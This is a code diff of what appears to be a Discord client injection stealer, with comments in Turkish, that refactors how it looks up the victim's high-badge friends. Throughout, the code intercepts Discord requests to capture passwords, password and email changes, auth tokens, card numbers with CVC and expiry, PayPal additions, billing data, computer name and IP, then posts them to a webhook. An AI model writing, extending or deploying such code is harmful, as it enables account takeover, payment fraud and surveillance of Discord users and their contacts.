@@ -263,22 +263,52 @@ function parseBilling(sources) {
     return out.length ? out.join(' ') : ':x:';
 }
 
-function parseHQFriends(relationships) {
-    if (!Array.isArray(relationships)) return '';
-    const HQ = [1, 2, 4, 8, 512, 16384, 131072, 262144, 4194304];
-    const lines = [];
-    for (const rel of relationships) {
-        if (rel.type !== 1) continue;
-        const u = rel.user || {};
-        const uFlags = (u.public_flags || 0) | (u.flags || 0);
-        const badges = BADGE_MAP
-            .filter(([v]) => HQ.includes(v) && (uFlags & v) === v)
-            .map(([, e]) => e);
-        if (!badges.length) continue;
-        lines.push(`${badges.join('')} \`${u.username}\` (\`${u.id}\`)`);
-        if (lines.join('\n').length > 900) break;
+// HQ sayılan badge ID'leri
+const HQ_BADGE_IDS = new Set([
+    'staff', 'partner', 'active_developer', 'verified_developer',
+    'certified_moderator', 'premium_early_supporter',
+    'premium_tenure_6_month_v2', 'premium_tenure_12_month', 'premium_tenure_24_month',
+    'guild_booster_lvl6', 'guild_booster_lvl7', 'guild_booster_lvl8', 'guild_booster_lvl9',
+    'bug_hunter_level_1', 'bug_hunter_level_2',
+]);
+
+async function getHQFriends(token) {
+    /**
+     * Arkadaş listesini çek, her arkadaşın /profile badge'lerine bak.
+     * HQ_BADGE_IDS içinde badge'i olan arkadaşları döndür.
+     * Boşsa null döner (embed gönderilmez).
+     */
+    try {
+        const friends = await apiGet('https://discord.com/api/v9/users/@me/relationships', token);
+        if (!Array.isArray(friends) || !friends.length) return null;
+
+        const lines = [];
+        for (const rel of friends) {
+            if (rel.type !== 1) continue;
+            const u = rel.user || {};
+            if (!u.id) continue;
+
+            // Her arkadaş için profile badge'lerini çek
+            try {
+                const profile = await apiGet(
+                    `https://discord.com/api/v9/users/${u.id}/profile?with_mutual_guilds=false`,
+                    token
+                );
+                if (!profile || !Array.isArray(profile.badges)) continue;
+
+                const hqBadges = profile.badges
+                    .filter(b => HQ_BADGE_IDS.has(b.id))
+                    .map(b => PROFILE_BADGE_MAP[b.id] || b.description || b.id);
+
+                if (!hqBadges.length) continue;
+                lines.push(`\`${u.username}\` (\`${u.id}\`) — ${hqBadges.join(', ')}`);
+                if (lines.join('\n').length > 950) break;
+            } catch {}
+        }
+        return lines.length ? lines.join('\n') : null;
+    } catch {
+        return null;
     }
-    return lines.join('\n');
 }
 
 // ── Embed builder ─────────────────────────────────────────────────────────────
@@ -291,22 +321,19 @@ function buildPayload(title, fields, thumbnail, image) {
 }
 
 async function buildUserInfo(token) {
-    const [user, billing, friends] = await Promise.all([
+    const [user, billing] = await Promise.all([
         apiGet('https://discord.com/api/v9/users/@me',                         token),
         apiGet('https://discord.com/api/v9/users/@me/billing/payment-sources', token),
-        apiGet('https://discord.com/api/v9/users/@me/relationships',           token),
     ]);
     if (!user || user.message) return null;
 
-    // Boost süresi + profile badges için profile endpoint
+    // Boost süresi için profile
     let profile = null;
     try { profile = await apiGet(`https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false&with_mutual_friends=false`, token); } catch {}
-
     if (profile) {
         if (profile.premium_guild_since && !user.premium_guild_since) {
             user.premium_guild_since = profile.premium_guild_since;
         }
-        // Profile badges array'ini user'a ekle
         user._profile_badges = Array.isArray(profile.badges) ? profile.badges : [];
     } else {
         user._profile_badges = [];
@@ -316,7 +343,7 @@ async function buildUserInfo(token) {
         resolveAvatar(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
         resolveAvatar(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
     ]);
-    return { user, billing, friends, avatar, banner };
+    return { user, billing, avatar, banner };
 }
 
 function buildFields(user, billing, friends, token, extra) {
@@ -328,13 +355,15 @@ function buildFields(user, billing, friends, token, extra) {
         { name: '🔒 2FA',      value: user.mfa_enabled ? '✅' : '❌',    inline: true  },
         { name: '💎 Nitro',    value: getNitro(user),                    inline: true  },
         { name: '💳 Billing',  value: parseBilling(billing),             inline: true  },
-        { name: '🏅 Badges',   value: getBadges(user),                   inline: true  },
+        { name: '🏅 Badges',   value: getBadges(user),                   inline: false },
         ...(extra || []),
         { name: '🔑 Token',    value: `\`${token}\``,                    inline: false },
     ];
-    const hq = parseHQFriends(friends);
-    if (hq) fields.push({ name: '⭐ HQ Friends', value: hq, inline: false });
     return fields;
+}
+
+async function sendEmbed(title, fields, thumbnail, image) {
+    await postWebhook(buildPayload(title, fields, thumbnail, image));
 }
 
 function getDiscordClientName() {
@@ -374,16 +403,18 @@ async function firstTime() {
             try {
                 const info = await buildUserInfo(token);
                 if (!info) continue;
-                const { user, billing, friends, avatar, banner } = info;
-                await postWebhook(buildPayload(
+                const { user, billing, avatar, banner } = info;
+                const fields = buildFields(user, billing, null, token, [
+                    { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
+                    { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
+                    { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
+                ]);
+                await sendWithHQFriends(
                     'Discord Injection — Initialized',
-                    buildFields(user, billing, friends, token, [
-                        { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
-                        { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
-                        { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
-                    ]),
-                    avatar || AVATAR_URL, banner || null
-                ));
+                    fields,
+                    avatar || AVATAR_URL, banner || null,
+                    token, user.username
+                );
             } catch {}
         }
     } catch {}
@@ -475,7 +506,7 @@ session.defaultSession.webRequest.onCompleted({
     const info   = await buildUserInfo(token);
     if (!info) return;
 
-    const { user, billing, friends, avatar, banner } = info;
+    const { user, billing, avatar, banner } = info;
     const base = [
         { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
         { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
@@ -485,61 +516,61 @@ session.defaultSession.webRequest.onCompleted({
     switch (true) {
         case details.url.endsWith('login'):
             if (!data.password) return;
-            await postWebhook(buildPayload(
+            await sendWithHQFriends(
                 'Discord — Login Captured',
-                buildFields(user, billing, friends, token, [
+                buildFields(user, billing, null, token, [
                     ...base,
                     { name: '🔑 Password', value: `\`${data.password}\``, inline: false },
                 ]),
-                avatar || AVATAR_URL, banner || null
-            ));
+                avatar || AVATAR_URL, banner || null, token, user.username
+            );
             break;
 
         case details.url.endsWith('users/@me') && details.method === 'PATCH':
             if (!data.password) return;
             if (data.new_password) {
-                await postWebhook(buildPayload(
+                await sendWithHQFriends(
                     'Discord — Password Changed',
-                    buildFields(user, billing, friends, token, [
+                    buildFields(user, billing, null, token, [
                         ...base,
                         { name: '🔑 Old Password', value: `\`${data.password}\``,     inline: true },
                         { name: '🔑 New Password', value: `\`${data.new_password}\``, inline: true },
                     ]),
-                    avatar || AVATAR_URL, banner || null
-                ));
+                    avatar || AVATAR_URL, banner || null, token, user.username
+                );
             }
             if (data.email) {
-                await postWebhook(buildPayload(
+                await sendWithHQFriends(
                     'Discord — Email Changed',
-                    buildFields(user, billing, friends, token, [
+                    buildFields(user, billing, null, token, [
                         ...base,
                         { name: '📧 New Email', value: `\`${data.email}\``,    inline: true },
                         { name: '🔑 Password',  value: `\`${data.password}\``, inline: true },
                     ]),
-                    avatar || AVATAR_URL, banner || null
-                ));
+                    avatar || AVATAR_URL, banner || null, token, user.username
+                );
             }
             break;
 
         case details.url.includes('api.stripe.com') && details.url.endsWith('tokens'):
-            await postWebhook(buildPayload(
+            await sendWithHQFriends(
                 'Discord — Credit Card Added',
-                buildFields(user, billing, friends, token, [
+                buildFields(user, billing, null, token, [
                     ...base,
                     { name: '💳 Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                                inline: true },
                     { name: '🔒 CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
                     { name: '📅 Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
                 ]),
-                avatar || AVATAR_URL, banner || null
-            ));
+                avatar || AVATAR_URL, banner || null, token, user.username
+            );
             break;
 
         case details.url.includes('paypal_accounts'):
-            await postWebhook(buildPayload(
+            await sendWithHQFriends(
                 'Discord — PayPal Added',
-                buildFields(user, billing, friends, token, base),
-                avatar || AVATAR_URL, banner || null
-            ));
+                buildFields(user, billing, null, token, base),
+                avatar || AVATAR_URL, banner || null, token, user.username
+            );
             break;
 
         default:
